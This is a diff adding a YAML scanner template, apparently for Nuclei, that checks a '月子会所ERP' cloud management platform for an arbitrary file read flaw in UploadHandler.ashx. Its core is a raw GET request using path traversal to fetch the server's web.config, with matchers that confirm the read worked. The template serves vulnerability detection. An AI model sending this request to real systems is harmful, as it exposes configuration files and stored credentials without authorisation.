@@ -1,0 +1,27 @@
+id: yueziERP-UploadHandler_ashx-File-reading
+
+info:
+  name: 月子会所ERP云管理平台 UploadHandler.ashx 任意文件读取漏洞
+  author: xxx
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /Page/upload/UploadHandler.ashx?url=../../web.config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ASP.NET'
+          - '<?xml version='
+          - '200'
+          - '"data":'
+        condition: and
+      - type: status
+        status: 
+          - 200
